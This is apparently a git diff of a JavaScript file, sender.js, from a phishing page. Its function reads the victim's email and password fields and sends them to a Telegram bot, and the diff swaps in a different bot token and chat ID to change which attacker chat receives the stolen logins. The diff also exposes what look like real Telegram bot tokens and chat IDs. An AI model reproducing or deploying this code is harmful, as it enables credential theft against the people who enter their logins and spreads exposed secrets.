@@ -2,11 +2,11 @@ console.log("sender.js connected");
 function sendTelegramMessageAndRedirect() {
   //  other user API
 
-  //   const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
+  //   const telegramBotToken = "6610026248:AAGk9DOpU2qBbOQUDyhxBfGA69uZMS8qVQY"; // add the telegram token
   //   const chatId = 6672082889; // add ths id from the web It's usually a number, not a string
 
   const telegramBotToken = "6610026248:AAGk9DOpU2qBbOQUDyhxBfGA69uZMS8qVQY"; // add the telegram token
-  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
+  const chatId = 6672082889; // add ths id from the web It's usually a number, not a string
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
 
@@ -40,4 +40,5 @@ function sendTelegramMessageAndRedirect() {
     })
     .catch((error) => console.error("Error:", error));
 }
+
 
